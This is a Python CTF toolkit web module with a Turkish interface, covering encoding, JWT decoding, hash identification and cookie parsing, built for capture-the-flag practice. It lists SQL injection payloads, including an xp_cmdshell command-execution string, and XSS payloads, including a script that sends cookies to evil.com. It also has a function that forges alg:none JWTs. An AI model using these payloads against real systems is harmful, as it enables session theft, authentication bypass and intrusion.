#!/usr/bin/env python3
"""
CTF Toolkit - Web Security Module
Author: Muhammet Özkaya
GitHub: https://github.com/muhammetozkaya/ctf-toolkit
"""

import argparse
import sys
import re
import json
import hashlib
import base64
from urllib.parse import quote, unquote, quote_plus, unquote_plus, urlparse, parse_qs
from html import escape, unescape
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich.syntax import Syntax
from rich import box

console = Console()

BANNER = """
[bold blue]
██╗    ██╗███████╗██████╗ 
██║    ██║██╔════╝██╔══██╗
██║ █╗ ██║█████╗  ██████╔╝
██║███╗██║██╔══╝  ██╔══██╗
╚███╔███╔╝███████╗██████╔╝
 ╚══╝╚══╝ ╚══════╝╚═════╝ 
[/bold blue]
[bold yellow]      CTF Toolkit - Web Module[/bold yellow]
[dim]      Author: Muhammet Özkaya[/dim]
"""

# ─── URL Encoding/Decoding ────────────────────────────────────────────────────

def url_encode(text: str, safe: str = '') -> str:
    return quote(text, safe=safe)

def url_decode(text: str) -> str:
    return unquote(text)

def url_encode_full(text: str) -> str:
    """Encode every character including safe ones"""
    return quote(text, safe='')

def url_encode_plus(text: str) -> str:
    """URL encode with + for spaces (form data)"""
    return quote_plus(text)

def url_decode_plus(text: str) -> str:
    return unquote_plus(text)

def url_encode_all(text: str) -> dict:
    """Show all URL encoding variations"""
    return {
        'Standard': url_encode(text),
        'Full (no safe chars)': url_encode_full(text),
        'Plus (form)': url_encode_plus(text),
        'Double encoded': url_encode(url_encode(text)),
    }

# ─── HTML Entity ──────────────────────────────────────────────────────────────

def html_encode(text: str) -> str:
    return escape(text)

def html_decode(text: str) -> str:
    return unescape(text)

def html_encode_decimal(text: str) -> str:
    """Encode as decimal HTML entities"""
    return ''.join(f'&#{ord(c)};' for c in text)

def html_encode_hex(text: str) -> str:
    """Encode as hex HTML entities"""
    return ''.join(f'&#x{ord(c):x};' for c in text)

# ─── JWT Token Analysis ───────────────────────────────────────────────────────

def jwt_decode(token: str) -> dict:
    """Decode JWT token without verification"""
    try:
        parts = token.strip().split('.')
        if len(parts) != 3:
            return {'error': f'Geçersiz JWT formatı. {len(parts)} kısım bulundu, 3 olmalı.'}

        def decode_segment(segment):
            # Add padding
            pad = 4 - len(segment) % 4
            if pad != 4:
                segment += '=' * pad
            try:
                decoded = base64.urlsafe_b64decode(segment)
                return json.loads(decoded)
            except json.JSONDecodeError:
                return base64.urlsafe_b64decode(segment).decode(errors='replace')
            except Exception as e:
                return {'decode_error': str(e)}

        header = decode_segment(parts[0])
        payload = decode_segment(parts[1])
        signature = parts[2]

        result = {
            'header': header,
            'payload': payload,
            'signature': signature,
            'signature_hex': base64.urlsafe_b64decode(signature + '==').hex() if signature else '',
        }

        # Security checks
        security_warnings = []
        if isinstance(header, dict):
            alg = header.get('alg', '').upper()
            if alg == 'NONE':
                security_warnings.append("⚠️  ALG: NONE - Token imzasız! (CVE-2015-9235)")
            if alg in ('HS256', 'HS384', 'HS512'):
                security_warnings.append(f"ℹ️  HMAC ({alg}) - Gizli anahtar ile imzalanmış")
            if alg in ('RS256', 'RS384', 'RS512'):
                security_warnings.append(f"ℹ️  RSA ({alg}) - Asimetrik şifreleme")

        if isinstance(payload, dict):
            import time
            exp = payload.get('exp')
            if exp:
                now = time.time()
                if exp < now:
                    diff = int(now - exp)
                    security_warnings.append(f"⚠️  TOKEN SÜRESİ DOLMUŞ! {diff} saniye önce")
                else:
                    diff = int(exp - now)
                    security_warnings.append(f"✓ Token geçerli, {diff} saniye kaldı")

            iat = payload.get('iat')
            if iat:
                import datetime
                dt = datetime.datetime.fromtimestamp(iat)
                security_warnings.append(f"ℹ️  Oluşturulma: {dt.strftime('%Y-%m-%d %H:%M:%S')}")

        result['security_warnings'] = security_warnings
        return result

    except Exception as e:
        return {'error': str(e)}

def jwt_check_none_alg(token: str) -> str:
    """Generate a JWT with alg:none for testing"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return "Geçersiz JWT"

        # Modify header alg to none
        header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
        header = json.loads(base64.urlsafe_b64decode(header_padded))
        header['alg'] = 'none'
        new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')

        return f"{new_header}.{parts[1]}."

    except Exception as e:
        return f"[ERROR] {e}"

# ─── Hash Identification ──────────────────────────────────────────────────────

HASH_PATTERNS = [
    (r'^[a-f0-9]{32}$', 'MD5', 'MD5 (128-bit)'),
    (r'^[a-f0-9]{40}$', 'SHA-1', 'SHA-1 (160-bit)'),
    (r'^[a-f0-9]{56}$', 'SHA-224', 'SHA-224 (224-bit)'),
    (r'^[a-f0-9]{64}$', 'SHA-256', 'SHA-256 (256-bit)'),
    (r'^[a-f0-9]{96}$', 'SHA-384', 'SHA-384 (384-bit)'),
    (r'^[a-f0-9]{128}$', 'SHA-512', 'SHA-512 (512-bit)'),
    (r'^\$2[aby]\$.{56}$', 'bcrypt', 'bcrypt (Blowfish)'),
    (r'^\$1\$.{22,}$', 'MD5 Crypt', 'MD5 Crypt (Linux)'),
    (r'^\$6\$.{86}$', 'SHA-512 Crypt', 'SHA-512 Crypt (Linux)'),
    (r'^\$5\$.{43}$', 'SHA-256 Crypt', 'SHA-256 Crypt (Linux)'),
    (r'^[a-f0-9]{8}$', 'CRC32', 'CRC32 (32-bit)'),
    (r'^[a-f0-9]{16}$', 'MD5 (half) / CRC64', 'Partial hash or CRC64'),
    (r'^[A-Za-z0-9+/]{43}=$', 'SHA-256 (Base64)', 'SHA-256 in Base64'),
    (r'^sha\d+:[a-f0-9]+$', 'Django Hash', 'Django Password Hash'),
    (r'^\*[A-F0-9]{40}$', 'MySQL5+', 'MySQL 5+ Password Hash'),
    (r'^[a-f0-9]{32}:[a-f0-9]{32}$', 'MD5 + Salt', 'MD5 with Salt (hashcat format)'),
    (r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', 'UUID', 'UUID / GUID'),
    (r'^[A-Za-z0-9+/]{88}==$', 'SHA-512 (Base64)', 'SHA-512 in Base64'),
]

def identify_hash(hash_str: str) -> list:
    """Identify hash type based on pattern matching"""
    hash_str = hash_str.strip()
    matches = []

    for pattern, name, description in HASH_PATTERNS:
        if re.match(pattern, hash_str, re.IGNORECASE):
            matches.append({'name': name, 'description': description, 'pattern': pattern})

    if not matches:
        # Try length-based identification
        length = len(hash_str)
        length_map = {
            8: 'Possibly CRC32',
            32: 'Possibly MD5',
            40: 'Possibly SHA-1',
            56: 'Possibly SHA-224',
            64: 'Possibly SHA-256 or BLAKE2s',
            96: 'Possibly SHA-384',
            128: 'Possibly SHA-512 or Whirlpool',
        }
        if length in length_map:
            matches.append({'name': 'Unknown', 'description': length_map[length], 'pattern': 'length-based'})
        else:
            matches.append({'name': 'Unknown', 'description': f'Unrecognized format (length: {length})', 'pattern': 'none'})

    return matches

def hash_text(text: str) -> dict:
    """Hash text with multiple algorithms"""
    encoded = text.encode()
    return {
        'MD5': hashlib.md5(encoded).hexdigest(),
        'SHA-1': hashlib.sha1(encoded).hexdigest(),
        'SHA-224': hashlib.sha224(encoded).hexdigest(),
        'SHA-256': hashlib.sha256(encoded).hexdigest(),
        'SHA-384': hashlib.sha384(encoded).hexdigest(),
        'SHA-512': hashlib.sha512(encoded).hexdigest(),
        'SHA-256 (Base64)': base64.b64encode(hashlib.sha256(encoded).digest()).decode(),
    }

# ─── URL Analysis ─────────────────────────────────────────────────────────────

def analyze_url(url: str) -> dict:
    """Analyze URL components"""
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        return {
            'scheme': parsed.scheme,
            'host': parsed.netloc,
            'path': parsed.path,
            'query_string': parsed.query,
            'fragment': parsed.fragment,
            'parameters': params,
            'username': parsed.username,
            'password': parsed.password,
            'port': parsed.port,
        }
    except Exception as e:
        return {'error': str(e)}

# ─── Cookie Decoder ───────────────────────────────────────────────────────────

def decode_cookie(cookie_str: str) -> dict:
    """Parse and decode a cookie string"""
    cookies = {}
    for part in cookie_str.split(';'):
        part = part.strip()
        if '=' in part:
            key, val = part.split('=', 1)
            cookies[key.strip()] = {
                'raw': val.strip(),
                'url_decoded': unquote(val.strip()),
                'html_decoded': unescape(val.strip()),
            }
            # Try base64
            try:
                b64 = base64.b64decode(val.strip() + '==').decode(errors='replace')
                if b64.isprintable():
                    cookies[key.strip()]['base64_decoded'] = b64
            except:
                pass
    return cookies

# ─── SQL Injection Payloads ───────────────────────────────────────────────────

SQLI_PAYLOADS = [
    ("'", "Basic SQLi test"),
    ("' OR '1'='1", "Auth bypass (single quote)"),
    ("\" OR \"1\"=\"1", "Auth bypass (double quote)"),
    ("' OR 1=1--", "Boolean-based (comment)"),
    ("' OR 1=1#", "Boolean-based (hash comment)"),
    ("admin'--", "Login bypass"),
    ("' UNION SELECT NULL--", "UNION test"),
    ("' AND SLEEP(5)--", "Time-based blind"),
    ("'; EXEC xp_cmdshell('whoami')--", "MSSQL command exec"),
    ("' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))--", "MySQL error-based"),
]

XSS_PAYLOADS = [
    ("<script>alert(1)</script>", "Basic XSS"),
    ("<img src=x onerror=alert(1)>", "XSS via img onerror"),
    ("<svg onload=alert(1)>", "XSS via SVG"),
    ("javascript:alert(1)", "JavaScript protocol"),
    ("'\"><img src=x onerror=alert(1)>", "Break out of attribute"),
    ("<iframe src=\"javascript:alert(1)\">", "XSS via iframe"),
    ("{{7*7}}", "SSTI test (Jinja2)"),
    ("${7*7}", "SSTI test (Freemarker)"),
    ("<script>fetch('https://evil.com?c='+document.cookie)</script>", "Cookie stealing"),
]

# ─── Display Helpers ──────────────────────────────────────────────────────────

def display_jwt(result: dict):
    if 'error' in result:
        console.print(f"[red]{result['error']}[/red]")
        return

    # Header
    header_json = json.dumps(result.get('header', {}), indent=2)
    console.print(Panel(
        Syntax(header_json, "json", theme="monokai"),
        title="[bold blue]Header[/bold blue]",
        border_style="blue"
    ))

    # Payload
    payload_json = json.dumps(result.get('payload', {}), indent=2)
    console.print(Panel(
        Syntax(payload_json, "json", theme="monokai"),
        title="[bold green]Payload[/bold green]",
        border_style="green"
    ))

    # Signature
    console.print(Panel(
        f"[dim]{result.get('signature', 'N/A')}[/dim]",
        title="[bold yellow]Signature[/bold yellow]",
        border_style="yellow"
    ))

    # Warnings
    if result.get('security_warnings'):
        warnings_text = '\n'.join(result['security_warnings'])
        console.print(Panel(
            warnings_text,
            title="[bold red]🛡️ Güvenlik Analizi[/bold red]",
            border_style="red"
        ))

def display_hash_identify(matches: list, hash_str: str):
    table = Table(title=f"Hash Tanımlama: {hash_str[:40]}...", box=box.ROUNDED, border_style="blue")
    table.add_column("Hash Türü", style="bold yellow")
    table.add_column("Açıklama", style="green")
    table.add_column("Yöntem", style="dim")

    for match in matches:
        table.add_row(match['name'], match['description'], match['pattern'][:40])

    console.print(table)

def display_url_analysis(result: dict, url: str):
    table = Table(title=f"URL Analizi", box=box.ROUNDED, border_style="blue")
    table.add_column("Bileşen", style="bold yellow")
    table.add_column("Değer", style="green")

    for key, val in result.items():
        if key == 'parameters':
            for param, values in val.items():
                table.add_row(f"Param: {param}", str(values))
        elif val:
            table.add_row(key, str(val))

    console.print(table)

def display_payloads(payloads: list, title: str):
    table = Table(title=title, box=box.ROUNDED, border_style="blue")
    table.add_column("#", style="dim", justify="right")
    table.add_column("Payload", style="bold red")
    table.add_column("Açıklama", style="yellow")

    for i, (payload, desc) in enumerate(payloads, 1):
        table.add_row(str(i), payload, desc)

    console.print(table)

# ─── Interactive Menu ─────────────────────────────────────────────────────────

def interactive_menu():
    from rich.prompt import Prompt

    while True:
        console.print(BANNER)
        console.print(Panel(
            "[1] URL Encode/Decode\n"
            "[2] HTML Entity Encode/Decode\n"
            "[3] JWT Token Decode\n"
            "[4] Hash Tanımlama\n"
            "[5] Metin Hash'leme\n"
            "[6] URL Analizi\n"
            "[7] Cookie Decoder\n"
            "[8] SQLi Payload'ları\n"
            "[9] XSS Payload'ları\n"
            "[0] Ana Menüye Dön",
            title="[bold blue]🌐 Web Güvenliği Araçları[/bold blue]",
            border_style="blue",
            box=box.ROUNDED
        ))

        choice = Prompt.ask("[bold yellow]Seçim[/bold yellow]", default="0")

        if choice == "0":
            break
        elif choice == "1":
            op = Prompt.ask("İşlem", choices=["encode", "decode"])
            text = Prompt.ask("Metin")
            if op == "encode":
                results = url_encode_all(text)
                table = Table(title="URL Encoding", box=box.ROUNDED, border_style="blue")
                table.add_column("Yöntem", style="yellow")
                table.add_column("Sonuç", style="green")
                for k, v in results.items():
                    table.add_row(k, v)
                console.print(table)
            else:
                console.print(Panel(url_decode(text), title="[green]URL Decoded[/green]", border_style="blue"))
        elif choice == "2":
            op = Prompt.ask("İşlem", choices=["encode", "decode"])
            text = Prompt.ask("Metin")
            if op == "encode":
                results = {
                    'Standard HTML': html_encode(text),
                    'Decimal Entities': html_encode_decimal(text),
                    'Hex Entities': html_encode_hex(text),
                }
                table = Table(title="HTML Encoding", box=box.ROUNDED, border_style="blue")
                table.add_column("Yöntem", style="yellow")
                table.add_column("Sonuç", style="green")
                for k, v in results.items():
                    table.add_row(k, v[:100])
                console.print(table)
            else:
                console.print(Panel(html_decode(text), title="[green]HTML Decoded[/green]", border_style="blue"))
        elif choice == "3":
            token = Prompt.ask("JWT Token")
            result = jwt_decode(token)
            display_jwt(result)
        elif choice == "4":
            hash_str = Prompt.ask("Hash değeri")
            matches = identify_hash(hash_str)
            display_hash_identify(matches, hash_str)
        elif choice == "5":
            text = Prompt.ask("Hash'lenecek metin")
            hashes = hash_text(text)
            table = Table(title="Hash Sonuçları", box=box.ROUNDED, border_style="blue")
            table.add_column("Algoritma", style="yellow")
            table.add_column("Hash", style="green")
            for algo, h in hashes.items():
                table.add_row(algo, h)
            console.print(table)
        elif choice == "6":
            url = Prompt.ask("URL")
            result = analyze_url(url)
            display_url_analysis(result, url)
        elif choice == "7":
            cookie = Prompt.ask("Cookie string")
            decoded = decode_cookie(cookie)
            for name, vals in decoded.items():
                console.print(Panel(
                    '\n'.join(f"[yellow]{k}:[/yellow] [green]{v}[/green]" for k, v in vals.items()),
                    title=f"[bold blue]Cookie: {name}[/bold blue]",
                    border_style="blue"
                ))
        elif choice == "8":
            display_payloads(SQLI_PAYLOADS, "🗄️  SQL Injection Payloads")
        elif choice == "9":
            display_payloads(XSS_PAYLOADS, "💉 XSS Payloads")
        else:
            console.print("[red]Geçersiz seçim![/red]")

        Prompt.ask("\n[dim]Devam etmek için Enter'a basın[/dim]")
        console.clear()

# ─── CLI Interface ─────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="CTF Toolkit - Web Security Module",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python web.py --url-encode "Hello World"
  python web.py --url-decode "Hello%20World"
  python web.py --html-encode "<script>alert(1)</script>"
  python web.py --jwt-decode "eyJhbGc..."
  python web.py --hash-id "5f4dcc3b5aa765d61d8327deb882cf99"
  python web.py --hash-text "password"
  python web.py --analyze-url "https://example.com/path?id=1&user=admin"
        """
    )
    parser.add_argument('--url-encode', metavar='TEXT', help='URL encode text')
    parser.add_argument('--url-decode', metavar='TEXT', help='URL decode text')
    parser.add_argument('--html-encode', metavar='TEXT', help='HTML entity encode')
    parser.add_argument('--html-decode', metavar='TEXT', help='HTML entity decode')
    parser.add_argument('--jwt-decode', metavar='TOKEN', help='Decode JWT token')
    parser.add_argument('--hash-id', metavar='HASH', help='Identify hash type')
    parser.add_argument('--hash-text', metavar='TEXT', help='Hash text with multiple algorithms')
    parser.add_argument('--analyze-url', metavar='URL', help='Analyze URL components')
    parser.add_argument('--cookie', metavar='COOKIE', help='Decode cookie string')
    parser.add_argument('--sqli', action='store_true', help='Show SQL injection payloads')
    parser.add_argument('--xss', action='store_true', help='Show XSS payloads')
    parser.add_argument('--interactive', '-i', action='store_true', help='Interactive menu')

    args = parser.parse_args()

    if args.interactive or len(sys.argv) == 1:
        interactive_menu()
        return

    console.print(BANNER)

    if args.url_encode:
        results = url_encode_all(args.url_encode)
        table = Table(title="URL Encoding", box=box.ROUNDED, border_style="blue")
        table.add_column("Yöntem", style="yellow")
        table.add_column("Sonuç", style="green")
        for k, v in results.items():
            table.add_row(k, v)
        console.print(table)

    elif args.url_decode:
        console.print(Panel(url_decode(args.url_decode), title="[green]URL Decoded[/green]", border_style="blue"))

    elif args.html_encode:
        console.print(Panel(html_encode(args.html_encode), title="[green]HTML Encoded[/green]", border_style="blue"))

    elif args.html_decode:
        console.print(Panel(html_decode(args.html_decode), title="[green]HTML Decoded[/green]", border_style="blue"))

    elif args.jwt_decode:
        result = jwt_decode(args.jwt_decode)
        display_jwt(result)

    elif args.hash_id:
        matches = identify_hash(args.hash_id)
        display_hash_identify(matches, args.hash_id)

    elif args.hash_text:
        hashes = hash_text(args.hash_text)
        table = Table(title="Hash Sonuçları", box=box.ROUNDED, border_style="blue")
        table.add_column("Algoritma", style="yellow")
        table.add_column("Hash", style="green")
        for algo, h in hashes.items():
            table.add_row(algo, h)
        console.print(table)

    elif args.analyze_url:
        result = analyze_url(args.analyze_url)
        display_url_analysis(result, args.analyze_url)

    elif args.cookie:
        decoded = decode_cookie(args.cookie)
        for name, vals in decoded.items():
            for k, v in vals.items():
                console.print(f"[yellow]{name}.{k}:[/yellow] [green]{v}[/green]")

    elif args.sqli:
        display_payloads(SQLI_PAYLOADS, "🗄️  SQL Injection Payloads")

    elif args.xss:
        display_payloads(XSS_PAYLOADS, "💉 XSS Payloads")

if __name__ == '__main__':
    main()
